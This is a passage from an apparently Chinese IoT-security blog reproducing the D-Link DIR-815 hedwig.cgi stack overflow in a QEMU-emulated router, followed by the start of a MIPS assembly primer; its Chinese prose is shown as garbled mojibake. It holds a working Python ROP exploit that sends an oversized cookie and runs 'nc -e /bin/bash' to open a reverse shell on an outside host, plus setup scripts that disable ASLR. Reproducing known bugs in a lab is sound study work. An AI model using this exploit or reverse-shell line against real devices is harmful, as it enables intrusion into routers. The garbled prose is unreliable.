<h4 id="å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡"><a href="#å®ç°å®¿ä¸»æœºä¸-qemu-çš„é€šä¿¡" class="headerlink" title="å®ç°å®¿ä¸»æœºä¸ qemu çš„é€šä¿¡"></a>å®ç°å®¿ä¸»æœºä¸ <code>qemu</code> çš„é€šä¿¡</h4><p>åˆ›å»ºä¸€ä¸ª <code>net.sh</code> è„šæœ¬ï¼Œæˆ‘è¿™é‡Œçš„ç½‘å¡æ˜¯ <code>ens33</code> ï¼Œå¦‚æœæ˜¯ <code>eth0</code>  çš„è¯ï¼Œå°±æŠŠå‡ºç°çš„ <code>ens33</code> æ¢æˆ <code>eth0</code> å³å¯ï¼Œ<code>chmod +x net.sh</code> ç»™æ–‡ä»¶å¯æ‰§è¡Œæƒé™ï¼Œç„¶å <code>./net.sh</code> è¿è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span></span></span><br><span class="line">sudo brctl addbr br0                     # æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span><br><span class="line">sudo brctl addif br0 ens33                # åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span><br><span class="line">sudo brctl stp br0 off                   # å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span><br><span class="line">sudo brctl setfd br0 1                   # è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span><br><span class="line">sudo brctl sethello br0 1                # è®¾ç½® br0 çš„ hello æ—¶é—´</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # å¯ç”¨ br0 æ¥å£</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # å¯ç”¨ç½‘å¡æ¥å£</span><br><span class="line">sudo dhclient br0                        # ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span><br><span class="line">sudo brctl show br0                      # æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span><br><span class="line">sudo brctl showstp br0                   # æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span><br></pre></td></tr></table></figure>



<p>ç„¶åå†æ‰§è¡Œå¦‚ä¸‹å‡ æ¡å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              # åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span><br><span class="line">sudo brctl addif br0 tap0                # åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # å¯ç”¨ tap0 æ¥å£</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<p>å†ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å¯åŠ¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª <code>mips</code> å†…æ ¸è¿˜æœ‰é•œåƒæ–‡ä»¶ï¼Œä¹‹å‰å¸ˆå‚…ä»¬ä¸Šæ”¾çš„é“¾æ¥å¥½åƒéƒ½å¤±æ•ˆäº†ã€‚è¿™é‡Œæ˜¯æ‰¾ <strong>winmt</strong> å¸ˆå‚…è¦çš„ä¸€ä»½ï¼Œä¸Šä¼ åˆ°ç½‘ç›˜ä¸Šäº†  é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v</a><br>æå–ç ï¼šl04v</p>
<p>å¦‚æœæ­¤æ—¶ <code>qemu</code> ä¸­çš„ç½‘å¡ <code>eth0</code> æ˜¯æœ‰ <code>ip</code> çš„ï¼Œå¹¶ä¸”èƒ½å¤Ÿ <code>ping</code> é€šå®¿ä¸»æœºçš„ <code>ip</code>ï¼Œé‚£å°±èƒ½è¯´æ˜ <code>qemu</code> å·²ç»èƒ½å’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡äº†</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212333766.png" alt="image-20230521233355276"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305212334427.png" alt="image-20230521233441258"></p>
<h4 id="å¯åŠ¨-httpd-æœåŠ¡"><a href="#å¯åŠ¨-httpd-æœåŠ¡" class="headerlink" title="å¯åŠ¨ httpd æœåŠ¡"></a>å¯åŠ¨ <code>httpd</code> æœåŠ¡</h4><p>åœ¨ <code>squashfs-root</code> çš„ä¸Šä¸€çº§ç›®å½•ä¸­ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œ <code>IP</code> æ¢æˆ <code>qemu</code> çš„ã€‚è¿™æ ·å¯ä»¥å®ç°è®¡ç®—æœºè¿œç¨‹ä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“ï¼Œä½œç”¨å°±æ˜¯æŠŠæå–å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿä¼ åˆ° <code>qemu</code> é‡Œé¢</p>
<p><code>sudo  scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</code></p>
<p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <code>http_conf</code> æ–‡ä»¶</p>
<p>å†™å…¥ä»¥ä¸‹ä»£ç ï¼ˆç½‘å¡å’Œ <code>IP</code> <code>port</code> è¦æ”¹æˆè‡ªå·±çš„ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #å¼€å¯log</span><br><span class="line">ErrorLog /log #logæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  #å¯¹åº”qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„ç½‘å¡</span><br><span class="line">    Address 10.214.140.139 #qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„IP</span><br><span class="line">    Port &quot;80&quot; #å¯¹åº”æœªè¢«ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ç„¶ååœ¨ç‰©ç†æœºä¸Š <code>/opt/tools/mipsel</code> ç›®å½•ï¼ˆæ²¡æœ‰çš„è¯å°±è‡ªå·±åˆ›å»ºå§ï¼‰ä¸­æ–°å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹é…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>ç»™è¿™ä¸ª <code>init.sh</code> ï¼Œå¯æ‰§è¡Œæƒé™ï¼Œç„¶åå°†å…¶æ‰§è¡Œ</p>
<p>ç„¶ååœ¨ <code>qemu</code> ä¸­çš„ <code>squashfs-root</code> ç›®å½•ä¸‹åˆ›å»º <code>init.sh</code> æ–‡ä»¶ï¼Œå†™å…¥ä¸‹é¢çš„å†…å®¹ã€‚ç»™å¯æ‰§è¡Œæƒé™ï¼Œç„¶åæ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>



<p>æœ€åè¿›åˆ° <code>/squashfs-root/sbin</code> ç›®å½•ä¸‹ï¼Œæ‰§è¡Œ <code>./httpd -f /root/squashfs-root/http_conf</code></p>
<p>åœ¨å®¿ä¸»æœºä¸­è®¿é—® <code>http://10.214.140.139/hedwig.cgi</code> å‘ç°å¯ä»¥æ­£å¸¸è®¿é—®äº†ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305220922344.png" alt="image-20230522092237155"></p>
<p>å¼€å¯ <code>httpd</code> æœåŠ¡åï¼Œå¦‚æœè¦è¿›è¡Œè°ƒè¯•åˆ™éœ€è¦ä¸‹è½½ä¸€ä¸ª <a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ï¼Œç„¶åå†ç”¨ <code>scp</code> å‘½ä»¤å°†å…¶ä¸Šä¼ åˆ° <code>qemu</code> ä¸­çš„ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹ã€‚</p>
<p>åœ¨ <code>qemu</code> ä¸­ <code>/root/squashfs-root/</code> ç›®å½•ä¸‹æ–°å»º <code>run.sh</code> è„šæœ¬ï¼ˆ<code>IP</code> æ”¹æˆå®¿ä¸»æœºçš„ï¼Œç«¯å£ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot;|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|/htdocs/web/hedwig.cgi</span></span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯èƒ½ä»å®¿ä¸»æœºä¸­è°ƒè¯• <code>qemu</code> ä¸­çš„ç¨‹åºï¼Œä½†æˆ‘è¿™é‡ŒæŠ¥äº†è¿™ä¸ªé”™è¯¯ï¼ˆæŠ˜è…¾äº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰è§£å†³ï¼Œäºæ˜¯å°±æš‚æ—¶æ”¾å¼ƒäº†è¿œç¨‹è°ƒè¯•çš„æƒ³æ³•ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221824553.png" alt="image-20230522182439980" style="zoom:50%;" />



<p>ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ä¹Ÿèƒ½ç¡®å®š <code>libc</code> åŸºåœ°å€ï¼Œå°±æ˜¯ç”¨è¿è¡Œ <code>hedwig.cgi</code> åè¿›è¡Œåå°æŒ‚èµ·ï¼Œç„¶åç”¨ <code>cat /proc/pid/maps</code> æŸ¥çœ‹ï¼Œå…ˆè·‘å‡ æ¬¡ç¨‹åºï¼Œå‘ç° <code>pid</code> çš„å¢é•¿æ˜¯æœ‰è§„å¾‹çš„ï¼Œäºæ˜¯æå‰é¢„æµ‹ä¸€ä¸‹ï¼Œå¤šå°è¯•å‡ æ¬¡å°±èƒ½æ‰“å°å‡ºæ¥å†…å­˜å¸ƒå±€è·å– <code>libc</code> åŸºåœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221542829.png" alt="image-20230522154245358"></p>
<p>å› ä¸ºæ²¡æ³•è°ƒè¯•ï¼Œè¿™é‡Œå°±ç›´æ¥ç”¨ç½‘ä¸Šå¸ˆå‚…çš„è„šæœ¬æ‰“äº†ï¼ˆä¸»è¦ç”¨æˆ·æ¨¡å¼å·²ç»å†™äº†å¥½å‡ ç§è„šæœ¬ï¼Œè¿™ä¸ªæ²¡æ³•è°ƒè¯•çš„é—®é¢˜æ­»æ´»è§£å†³ä¸äº†ï¼Œå¯¼è‡´äº†æ²¡æ³•è°ƒè¯• <code>rop</code>çš„å¸ƒå±€ï¼‰æ€è·¯å’Œç”¨æˆ·æ¨¡å¼ <code>ROP-system</code> çš„é‚£ä¸ªè„šæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå°±æŠŠå‘½ä»¤æ¢æˆåå¼¹ <code>shell</code> çš„å‘½ä»¤å³å¯</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 10.214.140.144 7788&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line">    ip_port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + ip_port + <span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line">    r = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ˜¯å·²ç»å°† <code>qemu</code> ä¸­æ¨¡æ‹Ÿçš„ç¯å¢ƒ <code>shell</code> åå¼¹åˆ°äº†å®¿ä¸»æœºä¸Šã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305221606264.png" alt="image-20230522160633923"></p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/16072562.html">DLink 815è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´åˆ†æä¸å¤ç° - unr4v31 - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44223394/article/details/128756188">ä»é›¶åˆ°ä¸€ï¼šå¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´_Y6blNU1Lçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jasonactions/article/details/118931633">qemuä¸å®¿ä¸»æœºç½‘ç»œé€šä¿¡é…ç½®_ubuntuä¸»æœºå’Œqemuç½‘ç»œäº’é€š_HZero.chençš„åšå®¢-CSDNåšå®¢</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/919c29c4.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/919c29c4.html" class="post-title-link" itemprop="url">IOTå®‰å…¨å…¥é—¨å­¦ä¹ --MIPSæ±‡ç¼–åŸºç¡€</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 15:51:54 / ä¿®æ”¹æ—¶é—´ï¼š22:45:10" itemprop="dateCreated datePublished" datetime="2023-05-15T15:51:54+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOTå®‰å…¨</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>è¯´ä¸‹å­¦ä¹  <code>MIPS</code> æ±‡ç¼–åŸºç¡€çš„æ€è·¯ï¼Œä½œä¸ºä¸€ä¸ªæ¥è§¦æ–°çŸ¥è¯†é¢çš„å°ç™½ï¼Œæˆ‘é¦–å…ˆå»æŸ¥äº†ä¸€ä¸‹å¦‚ä½•ç¼–è¯‘ <code>MIPS</code> æ¶æ„çš„ç¨‹åºï¼Œç„¶åè‡ªå·±å†™äº†ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œæ”¾å…¥ <code>IDA</code> åå¼€å§‹è¿›è¡Œæ±‡ç¼–ä»£ç çš„å­¦ä¹ ï¼Œé‡è§ä¸€æ¡æŒ‡ä»¤å°±å­¦ä¹ ä¸€æ¡æŒ‡ä»¤ï¼Œä¸ºäº†è§‚å¯Ÿæ›´ç»†è‡´çš„å†…å­˜å˜åŒ–åŒæ—¶è¿˜è¦å­¦ä¹ å¦‚ä½•ç”¨ <code>gdb</code> æ¥è¿›è¡Œ <code>MIPS</code> æ¶æ„ç¨‹åºçš„è°ƒè¯•ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è®°å½•è§åˆ°çš„æ±‡ç¼–æŒ‡ä»¤å’Œå¯„å­˜å™¨ç­‰ç­‰ï¼Œæ¥ç€æ˜¯å‡½æ•°è°ƒç”¨çº¦å®šçš„å­¦ä¹ ï¼Œå‚è€ƒç€ç½‘ä¸Šçš„æ–‡ç« å†ç»“åˆ <code>gdb</code> è°ƒè¯•åŸºæœ¬å°±èƒ½ç†è§£é€å½»ã€‚æ„Ÿè§‰å¯¹ <code>MIPS</code> æ±‡ç¼–åŸºç¡€å’Œå‡½æ•°è°ƒç”¨çº¦å®šå·²ç»å¾—å¿ƒåº”æ‰‹ï¼Œå°±å¯ä»¥åšä¸€äº› <code>PWN</code> é¢˜ä»¥æ­¤æ¥ç¨³å›ºæ‰“ä¸‹çš„åŸºç¡€ï¼Œæœ€åå°è¯•æ¥æ‰‹å†™å„ç§çš„ <code>shellcode</code>ã€‚å¸Œæœ›è¿™ä¸ªæ€è·¯èƒ½ç»™ä¹‹åè‡ªå­¦è€…ä¸€ç‚¹å€Ÿé‰´ã€‚</p>
<p>ä¸‹é¢å…ˆè®©æˆ‘ä»¬ç¼–è¯‘è¿è¡Œè‡ªå·±çš„ç¬¬ä¸€ä¸ª <code>MIPS</code> æ¶æ„çš„ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc demo.c -o demo -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> value=a+b;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c=sum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value ==&gt; %d\n&quot;</span>,c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨ä¸è°ƒè¯•"><a href="#å¯åŠ¨ä¸è°ƒè¯•" class="headerlink" title="å¯åŠ¨ä¸è°ƒè¯•"></a>å¯åŠ¨ä¸è°ƒè¯•</h3><h4 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h4><p>å¦‚æœæ˜¯å°ç«¯åºçš„ç¨‹åºä½¿ç”¨ <code>qemu-mipsel ./xxx</code> è¿è¡Œç¨‹åºï¼Œå¦‚æœæ˜¯å¤§ç«¯åºçš„ç¨‹åºç”¨ <code>qemu-mips ./xxx</code> è¿è¡Œç¨‹åº </p>
<p>è¡¥å……ï¼š</p>
<ol>
